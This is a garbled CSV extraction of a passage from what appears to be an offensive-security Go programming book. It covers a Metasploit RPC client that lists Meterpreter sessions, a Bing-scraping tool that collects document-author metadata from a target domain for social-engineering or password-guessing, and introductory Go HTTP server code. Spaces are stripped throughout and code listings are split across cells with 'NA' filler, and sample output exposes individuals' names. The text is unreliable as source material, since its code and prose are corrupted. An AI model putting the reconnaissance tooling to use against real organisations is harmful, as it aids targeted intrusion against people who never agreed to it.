"authenticationtoken,meaningyouhavetologinbeforethe",SessionList(),NA
methodcallwillsucceed.,NA,NA
Listing3-18,NA,NA
usesthe,Metasploit,NA
"receiverstructtoaccessatoken,whichisn’tavalid",NA,NA
valueyet—it’sanemptystring.Sincethecodeyou’re,NA,NA
"developinghereisn’tfullyfeatured,youcouldjustexplicitly",NA,NA
includeacalltoyour,Login(),NA
methodfromwithinthe,SessionList(),NA
"method,butforeachadditionalauthenticatedmethodyou ",NA,NA
"implement,you’dhavetocheckfortheexistenceofavalid ",NA,NA
authenticationtokenandmakeanexplicitcallto,Login(),NA
.This,NA,NA
isn’tgreatcodingpracticebecauseyou’dspendalotoftime ,NA,NA
"repeatinglogicthatyoucouldwrite,say,aspartofa ",NA,NA
bootstrappingprocess.,NA,NA
"You’vealreadyimplementedafunction,",New(),NA
",designedto",NA,NA
"beusedforbootstrapping,sopatchupthatfunctiontosee ",NA,NA
whatanewimplementationlookslikewhenincluding ,NA,NA
authenticationaspartoftheprocess(see,NA,NA
Listing3-18,NA,NA
).,"funcNew(host,user,passstring)
 (*Metasploit,error)❶
 { 
  
 msf:=&Metasploit{
  
 host:host, 
  
 user:user
 , 
  
 pass:pass
 ,
  
 }
  
  
 iferr:=msf.Login()❷;err!=nil{ 
 returnnil,err
  
  
 }
  
  
 returnmsf,nil
  
  
 }
  
 Listing3-18:InitializingtheclientwithembeddingMetasploitlogin(
 /ch-
 3/metasploit-minimal/rpc/msf.go
 )",NA
Thepatched-upcodenowincludesan,error,NA
aspartofthe ,NA,NA
returnvalueset❶.Thisistoalertonpossibleauthentication ,NA,NA
"failures.Also,addedtothelogicisanexplicitcalltothe",Login(),NA
method❷.Aslongasthe,Metasploit,NA
structisinstantiatedusing ,NA,NA
this,New(),NA
"function,yourauthenticatedmethodcallswillnow",NA,NA
haveaccesstoavalidauthenticationtoken.,NA,NA
CreatingaUtilityProgram,NA,NA
"Nearingtheendofthisexample,yourlasteffortistocreate ",NA,NA
theutilityprogramthatimplementsyourshinynewlibrary. ,NA,NA
Enterthecodein,NA,NA
Listing3-19,NA,NA
into,NA,NA
client/main.go,NA,NA
",runit,and ",NA,NA
watchthemagichappen.,"packagemain
  
 import
 ( 
  
 ""fmt"" 
  
 ""log""
  
 ""github.com/blackhat-go/bhg/ch-3/metasploit-
 minimal/rpc"" )
  
 funcmain(){ 
  
 host:=os.Getenv(""MSFHOST"") 
  
 pass:=os.Getenv(""MSFPASS"") 
  
 user:=""msf""
  
 ifhost==""""||pass==""""{ 
  
 log.Fatalln(""MissingrequiredenvironmentvariableMSFHOSTor 
 MSFPASS"") 
  
 } 
  
 msf,err:=rpc.New(host,user,pass)❶
  
 iferr!=nil{ 
  
 log.Panicln(err) 
  
 }
  
 ❷defermsf.Logout() 
  
 sessions,err:=msf.SessionList()❸
  
 iferr!=nil{ 
  
 log.Panicln(err) 
  
 }",NA
"First,bootstraptheRPCclientandinitializeanew",Metasploit,NA
"struct❶.Remember,youjustupdatedthisfunctiontoperfor",NA,NA
m ,NA,NA
"authenticationduringinitialization.Next,ensureyoudoprope",NA,NA
r cleanupbyissuingadeferredcalltothe,Logout(),NA
method❷. ,NA,NA
Thiswillrunwhenthe,main,NA
functionreturnsorexits.Youthen ,NA,NA
issueacalltothe,SessionList(),NA
method❸anditerateoverthat ,NA,NA
responsetolistouttheavailableMeterpretersessions❹.,NA,NA
"Thatwasalotofcode,butfortunately,implementingother ",NA,NA
APIcallsshouldbesubstantiallylessworksinceyou’lljustbe ,NA,NA
definingrequestandresponsetypesandbuildingthelibrary ,NA,NA
methodtoissuetheremotecall.Here’ssampleoutput ,NA,NA
"produceddirectlyfromourclientutility,showingone ",NA,NA
establishedMeterpretersession:,"$
 gorunmain.go
  
  
 Sessions:
  
  
 1WIN-HOME\jsmith@WIN-HOME",NA
Thereyouhaveit.You’vesuccessfullycreatedalibrary ,NA,NA
andclientutilitytointeractwitharemoteMetasploitinstance ,NA,NA
"toretrievetheavailableMeterpretersessions.Next,you’ll ",NA,NA
ventureintosearchengineresponsescrapinganddocument ,NA,NA
metadataparsing.,NA,NA
PARSINGDOCUMENTMETADATA ,NA,NA
WITHBINGSCRAPING,NA,NA
WITHBINGSCRAPING,NA,NA
"AswestressedintheShodansection,relativelybenign ",NA,NA
information—whenviewedinthecorrectcontext—canprove ,NA,NA
"tobecritical,increasingthelikelihoodthatyourattackagainst ",NA,NA
anorganizationsucceeds.Informationsuchasemployee ,NA,NA
"names,phonenumbers,emailaddresses,andclientsoftware ",NA,NA
versionsareoftenthemosthighlyregardedbecausethey ,NA,NA
provideconcreteoractionableinformationthatattackerscan ,NA,NA
directlyexploitorusetocraftattacksthataremoreeffective ,NA,NA
"andhighlytargeted.Onesuchsourceofinformation, ",NA,NA
"popularizedbyatoolnamedFOCA,isdocumentmetadata.",NA,NA
Applicationsstorearbitraryinformationwithinthe ,NA,NA
"structureofafilesavedtodisk.Insomecases,thiscaninclude ",NA,NA
"geographicalcoordinates,applicationversions,operating ",NA,NA
"systeminformation,andusernames.Betteryet,searchengines ",NA,NA
containadvancedqueryfiltersthatallowyoutoretrieve ,NA,NA
specificfilesforanorganization.Theremainderofthis ,NA,NA
chapterfocusesonbuildingatoolthat,NA,NA
scrapes,NA,NA
—orasmy ,NA,NA
"lawyercallsit,",NA,NA
indexes,NA,NA
—Bingsearchresultstoretrievea ,NA,NA
"targetorganization’sMicrosoftOfficedocuments, ",NA,NA
subsequentlyextractingrelevantmetadata.,NA,NA
SettingUptheEnvironmentandPlanning,NA,NA
"Beforedivingintothespecifics,we’llstartbystatingthe ",NA,NA
"objectives.First,you’llfocussolelyonOfficeOpenXML ",NA,NA
documents—thoseendingin,NA,NA
xlsx,NA,NA
",",NA,NA
docx,NA,NA
",",NA,NA
pptx,NA,NA
",andsoon.",NA,NA
"AlthoughyoucouldcertainlyincludelegacyOfficedatatypes, ",NA,NA
thebinaryformatsmakethemexponentiallymore ,NA,NA
"complicated,increasingcodecomplexityandreducing ",NA,NA
readability.ThesamecanbesaidforworkingwithPDFfiles.,NA,NA
"Also,thecodeyoudevelopwon’thandleBingpagination,",NA,NA
insteadonlyparsinginitialpagesearchresults.Weencourage ,NA,NA
youtobuildthisintoyourworkingexampleandexplorefile ,NA,NA
typesbeyondOpenXML.,NA,NA
"WhynotjustusetheBingSearchAPIsforbuildingthis, ",NA,NA
ratherthandoingHTMLscraping?Becauseyoualreadyknow ,NA,NA
howtobuildclientsthatinteractwithstructuredAPIs.There ,NA,NA
"arepracticalusecasesforscrapingHTMLpages,particularly ",NA,NA
whennoAPIexists.Ratherthanrehashingwhatyoualready ,NA,NA
"know,we’lltakethisasanopportunitytointroduceanew ",NA,NA
"methodofextractingdata.You’lluseanexcellentpackage, ",goquery,NA
",whichmimicsthefunctionalityof",jQuery,NA
",aJavaScript",NA,NA
librarythatincludesanintuitivesyntaxtotraverseHTML ,NA,NA
documentsandselectdatawithin.Startbyinstalling,goquery,NA
:,"$
 gogetgithub.com/PuerkitoBio/goquery",NA
"Fortunately,that’stheonlyprerequisitesoftwareneededt",NA,NA
o completethedevelopment.You’llusestandardGopackages ,NA,NA
"tointeractwithOpenXMLfiles.Thesefiles,despitetheirfile ",NA,NA
"typesuffix,areZIParchivesthat,whenextracted,contain ",NA,NA
XMLfiles.Themetadataisstoredintwofileswithinthe ,docProps,NA
directoryofthearchive:,"$
 unziptest.xlsx
  
  
 $
 tree
  
  
 --
 snip
 --
  
  
 |---docProps
  
  
 ||---app.xml
  
  
 ||---core.xml
  
  
 --
 snip
 —",NA
The,NA,NA
core.xml,NA,NA
filecontainstheauthorinformationaswellas ,NA,NA
modificationdetails.It’sstructuredasfollows:,NA,NA
The,creator,NA
❶and,lastModifiedBy,NA
❷elementsareofprimary ,NA,NA
interest.Thesefieldscontainemployeeorusernamesthatyo,NA,NA
u canuseinasocial-engineeringorpassword-guessing ,NA,NA
campaign.,NA,NA
The,NA,NA
app.xml,NA,NA
filecontainsdetailsabouttheapplicationtype ,NA,NA
andversionusedtocreatetheOpenXMLdocument.Here’s ,NA,NA
itsstructure:,"<?xmlversion=""1.0""encoding=""UTF-8""standalone=""yes""?>
  
 <Properties 
  
 xmlns=""http://schemas.openxmlformats.org/officeDocument/2006/extended-
 properties""
  
 xmlns:vt=""http://schemas.openxmlformats.org/officeDocument/2006/docPropsVTypes"">
  
 <Application>MicrosoftExcel</Application>❶<
 DocSecurity>0</DocSecurity>
  
 <ScaleCrop>false</ScaleCrop> 
  
 <HeadingPairs> 
  
 <vt:vectorsize=""2""baseType=""variant"">
  
 <vt:variant>",NA
You’reprimarilyinterestedinjustafewofthoseelements: ,Application,NA
"❶,",Company,NA
"❷,and",AppVersion,NA
❸.Theversionitself ,NA,NA
"doesn’tobviouslycorrelatetotheOfficeversionname,suchas",NA,NA
"Office2013,Office2016,andsoon,butalogicalmapping ",NA,NA
"doesexistbetweenthatfieldandthemorereadable, ",NA,NA
commonlyknownalternative.Thecodeyoudevelopwill ,NA,NA
maintainthismapping.,NA,NA
DefiningthemetadataPackage,NA,NA
In,NA,NA
Listing3-20,NA,NA
",definetheGotypesthatcorrespondtothese ",NA,NA
XMLdatasetsinanewpackagenamed,NA,NA
metadata,NA,NA
andputthe ,NA,NA
codeinafilenamed,NA,NA
openxml.go,NA,NA
—onetypeforeachXMLfile ,NA,NA
youwishtoparse.Thenaddadatamappingandconvenience ,NA,NA
functionfordeterminingtherecognizableOfficeversionthat,NA,NA
correspondstothe,AppVersion,NA
.,NA,NA
Afteryoudefinethe,OfficeCoreProperty,NA
and,OfficeAppProperty,NA
"types,defineamap,",OfficeVersions,NA
",thatmaintainsarelationship",NA,NA
ofmajorversionnumberstorecognizablereleaseyears❶.To ,NA,NA
"usethismap,defineamethod,",GetMajorVersion(),NA
",onthe ",OfficeAppProperty,NA
type❷.ThemethodsplitstheXMLdata’s ,AppVersion,NA
"valuetoretrievethemajorversionnumber❸, ",NA,NA
subsequentlyusingthatvalueandthe,OfficeVersions,NA
mapto ,NA,NA
retrievethereleaseyear❹.,NA,NA
MappingtheDatatoStructs,NA,NA
Nowthatyou’vebuiltthelogicandtypestoworkwithand,NA,NA
"inspecttheXMLdataofinterest,youcancreatethecodethat",NA,NA
readstheappropriatefilesandassignsthecontentstoyour,NA,NA
"structs.Todothis,define",NewProperties(),NA
and,process(),NA
"functions,",NA,NA
asshownin,NA,NA
Listing3-21,NA,NA
.,"funcNewProperties(r*zip.Reader)(*OfficeCoreProperty,*OfficeAppProperty, 
 error){❶
  
 varcorePropsOfficeCoreProperty
  
 varappPropsOfficeAppProperty
  
 for_,f:=ranger.File{❷
  
 switchf.Name{❸
  
 case""docProps/core.xml"": 
  
 iferr:=process(f,&coreProps)❹;err!=nil{ 
 returnnil,nil,err
  
 }
  
 case""docProps/app.xml"": 
  
 iferr:=process(f,&appProps)❺;err!=nil{ 
 returnnil,nil,err
  
 }
  
 default:
  
 continue
  
 }
  
 }
  
 return&coreProps,&appProps,nil
  
 }",NA
The,NewProperties(),NA
functionacceptsa,*zip.Reader,NA
",which ",NA,NA
representsan,io.Reader,NA
forZIParchives❶.Usingthe,zip.Reader,NA
"instance,iteratethroughallthefilesinthearchive❷, ",NA,NA
checkingthefilenames❸.Ifafilenamematchesoneofthe ,NA,NA
"twopropertyfilenames,callthe",process(),NA
"function❹❺,passing ",NA,NA
inthefileandthearbitrarystructuretypeyouwishtopopulate,NA,NA
—either,OfficeCoreProperty,NA
or,OfficeAppProperty,NA
.,NA,NA
The,process(),NA
functionacceptstwoparameters:a,*zip.File,NA
and ,NA,NA
an,interface{},NA
"❻.SimilartotheMetasploittoolyoudeveloped, ",NA,NA
thiscodeacceptsageneric,interface{},NA
typetoallowforthefile,NA,NA
contentstobeassignedintoanydatatype.Thisincreasescode,NA,NA
reusebecausethere’snothingtype-specificwithinthe,process(),NA
"function.Withinthefunction,thecodereadsthecontentsof ",NA,NA
thefileandunmarshalstheXMLdataintothestruct❼.,NA,NA
SearchingandReceivingFileswithBing,NA,NA
"Younowhaveallthecodenecessarytoopen,read,parse,and",NA,NA
"extractOfficeOpenXMLdocuments,andyouknowwhatyou",NA,NA
"needtodowiththefile.Now,youneedtofigureouthowto ",NA,NA
searchforandretrievefilesbyusingBing.Here’stheplanof ,NA,NA
actionyoushouldfollow:,"1.
  SubmitasearchrequesttoBingwithproperfilterstoretrievetargetedresults. 
 2.
  ScrapetheHTMLresponse,extractingtheHREF(link)datatoobtaindirect 
  
  
 URLsfordocuments.
  
 3.
  SubmitanHTTPrequestforeachdirectdocumentURL 
  
 4.
  Parsetheresponsebodytocreateazip.Reader 
  
 5.
  Passthezip.Readerintothecodeyoualreadydevelopedtoextractmetadata.",NA
Thefollowingsectionsdiscusseachofthesestepsinorder.,NA,NA
Thefirstorderofbusinessistobuildasearchquery ,NA,NA
"template.MuchlikeGoogle,Bingcontainsadvancedquery ",NA,NA
parametersthatyoucanusetofiltersearchresultson ,NA,NA
numerousvariables.Mostofthesefiltersaresubmittedina ,filter_type:value,NA
format.Withoutexplainingalltheavailablefilter,NA,NA
"types,let’sinsteadfocusonwhathelpsyouachieveyourgoal. ",NA,NA
Thefollowinglistcontainsthethreefiltersyou’llneed.Note ,NA,NA
"thatyoucoulduseadditionalfilters,butatthetimeofthis ",NA,NA
"writing,theybehavesomewhatunpredictably.",site,NA
Usedtofiltertheresultstoaspecificdomain,filetype,NA
Usedtofiltertheresultsbasedoffresourcefiletype,instreamset,NA
Usedtofiltertheresultstoincludeonlycertain,NA,NA
fileextensions,NA,NA
Anexamplequerytoretrieve,NA,NA
docx,NA,NA
filesfrom,NA,NA
nytimes.com ,NA,NA
wouldlooklikethis:,site:nytimes.com&&filetype:docx&&instreamset:(urltitle):docx,NA
"Aftersubmittingthatquery,takeapeekattheresulting ",NA,NA
URLinyourbrowser.Itshouldresemble,NA,NA
Figure3-1,NA,NA
.,NA,NA
"Additionalparametersmayappearafterthis,butthey’re ",NA,NA
"inconsequentialforthisexample,soyoucanignorethem.",NA,NA
"NowthatyouknowtheURLandparameterformat,you ",NA,NA
"canseetheHTMLresponse,butfirstyouneedtodetermine ",NA,NA
whereintheDocumentObjectModel(DOM)thedocument ,NA,NA
linksreside.Youcandothisbyviewingthesourcecode ,NA,NA
"directly,orlimittheguessworkandjustuseyourbrowser’s ",NA,NA
developertools.ThefollowingimageshowsthefullHTML ,NA,NA
elementpathtothedesiredHREF.Youcanusetheelement ,NA,NA
"inspector,asin",NA,NA
Figure3-1,NA,NA
",toquicklyselectthelinktoreveal ",NA,NA
itsfullpath.,NA,NA
"Withthatpathinformation,youcanuse",goquery,NA
to ,NA,NA
systematicallypullalldataelementsthatmatchanHTML ,NA,NA
path.Enoughtalk!,NA,NA
Listing3-22,NA,NA
"putsitalltogether:retrieving, ",NA,NA
"scraping,parsing,andextracting.Savethiscodeto",NA,NA
main.go,NA,NA
.,"❶funchandler(iint,s*goquery.Selection){ 
 url,ok:=s.Find(""a"").Attr(""href"")❷
  
 if!ok{
  
  
 return",NA
"Youcreatetwofunctions.Thefirst,",handler(),NA
",acceptsa ",goquery.Selection,NA
"instance❶(inthiscase,itwillbepopulated ",NA,NA
withananchorHTMLelement)andfindsandextractsthe,href,NA
attribute❷.Thisattributecontainsadirectlinktothe ,NA,NA
"documentreturnedfromtheBingsearch.UsingthatURL,the ",NA,NA
codethenissuesaGETrequesttoretrievethedocument❸. ,NA,NA
"Assumingnoerrorsoccur,youthenreadtheresponsebody❹,",NA,NA
leveragingittocreatea,zip.Reader,NA
❺.Recallthatthe ,NA,NA
functionyoucreatedearlierinyour,metadata,NA
"package,",NewProperties(),NA
",expectsa",zip.Reader,NA
.Nowthatyouhavethe ,NA,NA
"appropriatedatatype,passittothatfunction❻,and ",NA,NA
propertiesarepopulatedfromthefileandprintedtoyour,NA,NA
screen.,NA,NA
The,main(),NA
functionbootstrapsandcontrolsthewhole,NA,NA
process;youpassitthedomainandfiletypeascommandline,NA,NA
arguments.Thefunctionthenusesthisinputdatatobuildthe ,NA,NA
Bingquerywiththeappropriatefilters❼.Thefilterstringis,NA,NA
encodedandusedtobuildthefullBingsearchURL❽.The ,NA,NA
searchrequestissentusingthe,goquery.NewDocument(),NA
function,NA,NA
",",NA,NA
whichimplicitlymakesanHTTPGETrequestandreturnsa,goquery,NA
-friendlyrepresentationoftheHTMLresponse ,NA,NA
document❾.Thisdocumentcanbeinspectedwith,goquery,NA
. ,NA,NA
"Finally,usetheHTMLelementselectorstringyouidentified ",NA,NA
withyourbrowserdevelopertoolstofindanditerateover ,NA,NA
"matchingHTMLelements❿.Foreachmatchingelement,a ",NA,NA
callismadetoyour,handler(),NA
function.,NA,NA
Asamplerunofthecodeproducesoutputsimilartothe ,NA,NA
following:,"$
 gorunmain.gonytimes.comdocx
  
 0: 
  
 http://graphics8.nytimes.com/packages/pdf/2012NAIHSAnnualHIVReport041713
 .docx
  
 2020/12/2111:53:50JonathanV.IraluDanFrosch-MicrosoftMacintosh
  
 Word2010 
  
 1:http://www.nytimes.com/packages/pdf/business/Announcement.docx 
  
 2020/12/2111:53:51agouseragouser-MicrosoftOfficeOutlook2007 
 2:http://www.nytimes.com/packages/pdf/business/DOCXIndictment.docx 
 2020/12/2111:53:51AGOGonder,Nanci-MicrosoftOfficeWord 2007 
  
 3:http://www.nytimes.com/packages/pdf/business/BrownIndictment.docx 
 2020/12/2111:53:51AGOGonder,Nanci-MicrosoftOfficeWord 2007 
  
 4:http://graphics8.nytimes.com/packages/pdf/health/Introduction.docx 
  
 2020/12/2111:53:51Oberg,AmandaMKarenBarrow-Microsoft
  
 MacintoshWord2010",NA
Youcannowsearchforandextractdocumentmetadatafor ,NA,NA
allOpenXMLfileswhiletargetingaspecificdomain.I ,NA,NA
encourageyoutoexpandonthisexampletoincludelogicto,NA,NA
"navigatemultipageBingsearchresults,toincludeotherfile ",NA,NA
"typesbeyondOpenXML,andtoenhancethecodeto",NA,NA
concurrentlydownloadtheidentifiedfiles.,NA,NA
SUMMARY,NA,NA
ThischapterintroducedtoyoufundamentalHTTPconceptsin ,NA,NA
"Go,whichyouusedtocreateusabletoolsthatinteractedwith ",NA,NA
"remoteAPIs,aswellastoscrapearbitraryHTMLdata.Inthe ",NA,NA
"nextchapter,you’llcontinuewiththeHTTPthemebylearning ",NA,NA
tocreateserversratherthanclients.,NA,NA
4 ,NA,NA
"HTTPSERVERS,ROUTING,AND ",NA,NA
MIDDLEWARE,NA,NA
"IfyouknowhowtowriteHTTPserversfromscratch,youcan ",NA,NA
"createcustomizedlogicforsocialengineering,command-and-",NA,NA
"control(C2)transports,orAPIsandfrontendsforyourown ",NA,NA
"tools,amongotherthings.Luckily,Gohasabrilliantstandard ",NA,NA
package—,net/http,NA
—forbuildingHTTPservers;it’sreallyall,NA,NA
"youneedtoeffectivelywritenotonlysimpleservers,butalso ",NA,NA
"complex,full-featuredwebapplications.",NA,NA
"Inadditiontothestandardpackage,youcanleveragethird-",NA,NA
partypackagestospeedupdevelopmentandremovesomeof ,NA,NA
"thetediousprocesses,suchaspatternmatching.These ",NA,NA
"packageswillassistyouwithrouting,buildingmiddleware, ",NA,NA
"validatingrequests,andothertasks.",NA,NA
"Inthischapter,you’llfirstexploremanyofthetechniques ",NA,NA
neededtobuildHTTPserversusingsimpleapplications.Then ,NA,NA
you’lldeploythesetechniquestocreatetwosocialengineering ,NA,NA
applications—acredential-,NA,NA
harvestingserverandakeylogging server—,NA,NA
andmultiplexC2channels.,NA,NA
HTTPSERVERBASICS,NA,NA
"Inthissection,you’llexplorethe",net/http,NA
packageanduseful,NA,NA
third-,NA,NA
"partypackagesbybuildingsimpleservers,routers,and ",NA,NA
middleware.We’llexpandonthesebasicstocovermore ,NA,NA
nefariousexampleslaterinthechapter.,NA,NA
BuildingaSimpleServer,NA,NA
Thecodein,NA,NA
Listing4-1,NA,NA
startsaserverthathandlesrequeststo ,NA,NA
asinglepath.(Allthecodelistingsattherootlocationof/ ,NA,NA
existundertheprovidedgithubrepo ,NA,NA
https://github.com/blackhat-,NA,NA
go/bhg/,NA,NA
.)Theservershouldlocate ,NA,NA
the,name,NA
URLparametercontainingauser’snameandrespond,NA,NA
withacustomizedgreeting.,"packagemain
  
  
 import(
  
 ""fmt"" 
  
 ""net/http""
  
 )
  
  
 funchello(whttp.ResponseWriter,r*http.Request){
  
 fmt.Fprintf(w,""Hello%s\n"",r.URL.Query().Get(""name""))
  
 }
  
  
 funcmain(){
  
 ❶http.HandleFunc(""/hello"",hello)
  
 ❷http.ListenAndServe("":8000"",nil) 
  
 }
  
 Listing4-1:AHelloWorldserver(
 /ch-4/hello_world/main.go
 )",NA
Thissimpleexampleexposesaresourceat,/hello,NA
.The,NA,NA
resourcegrabstheparameterandechoesitsvaluebacktothe ,NA,NA
client.Withinthe,main(),NA
"function,",http.HandleFunc(),NA
❶takestwo,NA,NA
"arguments:astring,whichisaURLpathpatternyou’re ",NA,NA
"instructingyourservertolookfor,andafunction,whichwill ",NA,NA
actuallyhandletherequest.Youcouldprovidethefunction ,NA,NA
"definitionasananonymousinlinefunction,ifyouwant.Inthis ",NA,NA
"example,youpassinthefunctionnamed",hello(),NA
thatyou,NA,NA
definedearlier.,NA,NA
The,hello(),NA
functionhandlesrequestsandreturnsahello,NA,NA
messagetotheclient.Ittakestwoargumentsitself.Thefirstis ,http.ResponseWriter,NA
",whichisusedtowriteresponsestothe",NA,NA
request.Thesecondargumentisapointerto,http.Request,NA
",which",NA,NA
willallowyoutoreadinformationfromtheincomingrequest. ,NA,NA
Notethatyouaren’tcallingyour,hello(),NA
functionfrom,main(),NA
.,NA,NA
You’resimplytellingyourHTTPserverthatanyrequestsfor ,/hello,NA
shouldbehandledbyafunctionnamed,hello(),NA
.,NA,NA
"Underthecovers,whatdoes",http.HandleFunc(),NA
actuallydo?,NA,NA
TheGodocumentationwilltellyouthatitplacesthehandler ,NA,NA
onthe,DefaultServerMux,NA
.A,ServerMux,NA
isshortfora,NA,NA
server,NA,NA
multiplexer,NA,NA
",whichisjustafancywaytosaythatthe ",NA,NA
underlyingcodecanhandlemultipleHTTPrequestsfor ,NA,NA
"patternsandfunctions.Itdoesthisusinggoroutines,withone ",NA,NA
goroutineperincomingrequest.Importingthe,net/http,NA
packag,NA,NA
e,NA,NA
createsa,ServerMux,NA
andattachesittothatpackage’snamespace;,NA,NA
thisisthe,DefaultServerMux,NA
.,NA,NA
Thenextlineisacallto,http.ListenAndServe(),NA
"❷,whichtakesa ",NA,NA
stringandan,http.Handler,NA
asarguments.ThisstartsanHTTP,NA,NA
"serverbyusingthefirstargumentastheaddress.Inthiscase, ",NA,NA
that’s,:8000,NA
",whichmeanstheservershouldlistenonport8000",NA,NA
"acrossallinterfaces.Forthesecondargument,the",http.Handler,NA
",",NA,NA
youpassin,nil,NA
".Asaresult,thepackageuses",DefaultServerMux,NA
as,NA,NA
"theunderlyinghandler.Soon,you’llbeimplementingyour ",NA,NA
own,http.Handler,NA
"andwillpassthatin,butfornowyou’lljustuse ",NA,NA
thedefault.Youcouldalsouse,http.ListenAndServeTLS(),NA
",which ",NA,NA
"willstartaserverusingHTTPSandTLS,asthename ",NA,NA
"describes,butrequiresadditionalparameters.",NA,NA
Implementingthe,http.Handler,NA
interfacerequiresasingle ,NA,NA
method:,"ServeHTTP(http.ResponseWriter,*http.Request)",NA
.Thisisgreat ,NA,NA
becauseitsimplifiesthecreationofyourowncustomHTTP ,NA,NA
servers.You’llfindnumerousthird-,NA,NA
partyimplementationsthat ,NA,NA
extendthe,net/http,NA
functionalitytoaddfeaturessuchas ,NA,NA
"middleware,authentication,responseencoding,andmore.",NA,NA
Youcantestthisserverbyusing,curl,NA
:,"$
 curl-ihttp://localhost:8000/hello?name=alice
  
  
 HTTP/1.1200OK
  
  
 Date:Sun,12Jan202001:18:26GMT
  
  
 Content-Length:12
  
  
 Content-Type:text/plain;charset=utf-8
  
  
 Helloalice",NA
Excellent!Theserveryoubuiltreadsthe,name,NA
URL ,NA,NA
parameterandreplieswithagreeting.,NA,NA
BuildingaSimpleRouter ,NA,NA
"Nextyou’llbuildasimplerouter,shownin",NA,NA
Listing4-2,NA,NA
",that ",NA,NA
demonstrateshowtodynamicallyhandleinboundrequestsb,NA,NA
y inspectingtheURLpath.DependingonwhethertheURL ,NA,NA
containsthepath,/a,NA
",",/b,NA
",or",/c,NA
",you’llprinteitherthemessage ",Executing/a,NA
",",Executing/b,NA
",or",Executing/c,NA
.You’llprinta,404NotFound,NA
errorforeverythingelse.,NA,NA
"First,youdefineanewtypenamed",router,NA
withoutanyfields,NA,NA
❶.You’llusethistoimplementthe,http.Handler,NA
interface.Todo ,NA,NA
"this,youmustdefinethe",ServeHTTP(),NA
method❷.Themethod ,NA,NA
usesa,switch,NA
"statementontherequest’sURLpath❸,executing ",NA,NA
differentlogicdependingonthepath.Itusesadefault,"404Not
  
 Found",NA
responseaction.In,main(),NA
",youcreateanew",router,NA
andpass ,NA,NA
itsrespectivepointerto,http.ListenAndServe(),NA
❹.,NA,NA
Let’stakethisforaspinintheoleterminal:,"$
 curlhttp://localhost:8000/a
  
  
 Executing/a
  
  
 $
 curlhttp://localhost:8000/d
  
  
 404NotFound",NA
Everythingworksasexpected;theprogramreturnsthe ,NA,NA
message,Executing/a,NA
foraURLthatcontainsthe,/a,NA
"path,andit",NA,NA
returnsa404responseonapaththatdoesn’texist.Thisisa ,NA,NA
trivialexample.Thethird-partyroutersthatyou’llusewill ,NA,NA
"havemuchmorecomplexlogic,butthisshouldgiveyoua ",NA,NA
basicideaofhowtheywork.,NA,NA
BuildingSimpleMiddleware,NA,NA
Nowlet’sbuild,NA,NA
middleware,NA,NA
",whichisasortofwrapperthat ",NA,NA
willexecuteonallincomingrequestsregardlessofthe ,NA,NA
destinationfunction.Intheexamplein,NA,NA
Listing4-3,NA,NA
",you’ll ",NA,NA
createaloggerthatdisplaystherequest’sprocessingstartand ,NA,NA
stoptime.,"Packagemain
  
  
 import(
  
 ""fmt"" 
  
 ""log"" 
  
 ""net/http"" 
  
 ""time"" 
  
 )
  
 ❶typeloggerstruct{ 
  
 Innerhttp.Handler
  
 }
  
 ❷func(l*logger)ServeHTTP(whttp.ResponseWriter,r*http.Request){ 
 log.Println(""start"")",NA
Whatyou’reessentiallydoingiscreatinganouterhandler ,NA,NA
"that,oneveryrequest,logssomeinformationontheserverand ",NA,NA
callsyour,hello(),NA
function.Youwrapthislogginglogicaround,NA,NA
yourfunction.,NA,NA
"Aswiththeroutingexample,youdefineanewtypenamed ",logger,NA
",butthistimeyouhaveafield,",Inner,NA
",whichisan",http.Handler,NA
itself❶.Inyour,ServeHTTP(),NA
"definition❷,youuse",log(),NA
toprint ,NA,NA
"thestartandfinishtimesoftherequest,callingtheinner ",NA,NA
handler’s,ServeHTTP(),NA
"methodinbetween❸.Totheclient,the ",NA,NA
requestwillfinishinsidetheinnerhandler.Inside,main(),NA
",you ",NA,NA
use,http.HandlerFunc(),NA
tocreatean,http.Handler,NA
outofafunction❹. ,NA,NA
Youcreatethe,logger,NA
",setting",Inner,NA
toyournewlycreatedhandler,NA,NA
"❺.Finally,youstarttheserverbyusingapointertoa",logger,NA
instance❻.,NA,NA
Runningthisandissuingarequestoutputstwomessages ,NA,NA
containingthestartandfinishtimesoftherequest:,"$
 gobuild-osimple_middleware",NA
"Inthefollowingsections,we’lldigdeeperintomiddleware ",NA,NA
"androutingandusesomeofourfavoritethird-partypackages, ",NA,NA
whichletyoucreatemoredynamicroutesandexecute ,NA,NA
middlewareinsideachain.We’llalsodiscusssomeusecases ,NA,NA
formiddlewarethatmoveintomorecomplexscenarios.,NA,NA
Routingwiththegorilla/muxPackage,NA,NA
Asshownin,NA,NA
Listing4-2,NA,NA
",youcanuseroutingtomatcha ",NA,NA
request’spathtoafunction.Butyoucanalsouseittomatch ,NA,NA
otherproperties—suchastheHTTPverborhostheader—toa ,NA,NA
function.Severalthird-partyroutersareavailableintheGo ,NA,NA
"ecosystem.Here,we’llintroduceyoutooneofthem:the ",gorilla/mux,NA
"package.Butjustaswitheverything,weencourage",NA,NA
youtoexpandyourknowledgebyresearchingadditiona,NA,NA
l packagesasyouencounterthem.,NA,NA
The,gorilla/mux,NA
"packageisamature,third-partyrouting",NA,NA
packagethatallowsyoutoroutebasedonbothsimpleand ,NA,NA
"complexpatterns.Itincludesregularexpressions,paramet",NA,NA
"er matching,verbmatching,andsubrouting,amongother ",NA,NA
features.,NA,NA
Let’sgooverafewexamplesofhowyoumightusethe ,NA,NA
"router.Thereisnoneedtorunthese,asyou’llbeusingthem ",NA,NA
"inarealprogramsoon,butpleasefeelfreetoplayaroundand ",NA,NA
experiment.,NA,NA
Beforeyoucanuse,gorilla/mux,NA
",youmust",goget,NA
it:,"$
 gogetgithub.com/gorilla/mux",NA
"Now,youcanstartrouting.Createyourrouterbyusing",mux.NewRouter(),NA
:,r:=mux.NewRouter(),NA
Thereturnedtypeimplements,http.Handler,NA
buthasahostof,NA,NA
otherassociatedmethodsaswell.Theoneyou’llusemost,NA,NA
oftenis,HandleFunc(),NA
".Forexample,ifyouwantedtodefinea",NA,NA
newroutetohandleGETrequeststothepattern,/foo,NA
",youcould",NA,NA
usethis:,"r.HandleFunc(""/foo"",func(whttp.ResponseWriter,req*http.Request){
  
  
 fmt.Fprint(w,""hifoo"") 
  
 }).Methods(""GET"")❶",NA
"Now,becauseofthecallto",Methods(),NA
"❶,onlyGETrequests ",NA,NA
willmatchthisroute.Allothermethodswillreturna404,NA,NA
"response.Youcanchainotherqualifiersontopofthis,suchas",Host(string),NA
",whichmatchesaparticularhostheadervalue.For",NA,NA
"example,thefollowingwillmatchonlyrequestswhosehost",NA,NA
headerissetto,NA,NA
